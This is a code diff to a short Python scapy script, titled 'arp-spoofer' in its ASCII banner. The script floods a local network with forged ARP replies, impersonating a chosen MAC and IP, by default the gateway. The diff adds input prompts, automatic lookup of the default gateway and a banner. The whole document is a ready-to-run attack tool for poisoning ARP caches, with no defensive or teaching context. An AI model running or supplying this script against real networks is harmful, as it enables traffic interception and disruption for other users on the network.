@@ -3,18 +3,25 @@
 
 from scapy.all import *
 
+os.system('cls' if os.name=='nt' else 'clear')
+print("┌─┐┬─┐┌─┐   ┌─┐┌─┐┌─┐┌─┐┌─┐┌─┐┬─┐")
+print("├─┤├┬┘├─┘───└─┐├─┘│ ││ │├┤ ├┤ ├┬┘")
+print("┴ ┴┴└─┴     └─┘┴  └─┘└─┘└  └─┘┴└─\n")
+
 
 try:
-    SRCMAC = Ether().src
-    SRCIP = input("IP to spoof: ")
-    DSTMAC = 'ff:ff:ff:ff:ff:ff'
-    DSTIP = '255.255.255.255'
+    mac = input("MAC to spoof (leave blank for host MAC):\n > ")
+    ip = input("IP to spoof (leave blank for default gateway):\n > ")
+    SRC_MAC = mac if mac else Ether().src
+    SRC_IP = ip if ip else conf.route.route('8.8.8.8')[2]
+    DST_MAC = 'ff:ff:ff:ff:ff:ff'
+    DST_IP = '255.255.255.255'
 
-    print(f"SRC: {SRCMAC} ; {SRCIP}")
-    print(f"DST: {DSTMAC} ; {DSTIP}")
+    print(f"\nsrc: {SRC_MAC} ; {SRC_IP}")
+    print(f"dst: {DST_MAC} ; {DST_IP}\n")
 
-    pkt = Ether(src=SRCMAC, dst=DSTMAC)/\
-          ARP(op=2, hwsrc=SRCMAC, psrc=SRCIP, hwdst=DSTMAC, pdst=DSTIP)
+    pkt = Ether(src=SRC_MAC, dst=DST_MAC) /\
+          ARP(op=2, hwsrc=SRC_MAC, psrc=SRC_IP, hwdst=DST_MAC, pdst=DST_IP)
 
     print("Sending packets, press CTRL+C to stop.")
     sendp(pkt, loop=1, inter=0.05)
